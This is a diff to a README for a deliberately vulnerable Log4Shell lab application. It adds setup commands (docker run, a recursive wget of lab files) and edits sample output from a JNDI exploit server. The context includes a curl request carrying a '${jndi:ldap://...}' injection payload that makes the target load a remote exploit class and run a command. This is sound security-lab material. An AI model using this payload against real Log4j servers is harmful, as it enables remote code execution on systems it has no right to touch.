@@ -8,6 +8,18 @@ It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.
 
 ## Running the application
 
+Run it:
+
+```bash
+docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+```
+
+Download the requried package on the host machine running Docker:
+
+```bash
+wget -r –level=0 -E –ignore-length -x -k -p -erobots=off -np -N https://github.com/gyaansastra/Attack-Defense-Lab/tree/dev/docker-compose/shunya/log4j/poc1
+```
+
 Run a complete security lab environment for log4shell:
 
 ```bash
@@ -45,8 +57,8 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/
 [+] Command: touch /tmp/pwned
 
 [+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
-[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
-[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
+[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://localhost:8888/Exploitjkk87OnvOH.class
+[+] New HTTP Request From /localhost:50119  /Exploitjkk87OnvOH.class
 [+] Receive ClassRequest: Exploitjkk87OnvOH.class
 [+] Response Code: 200
 ```
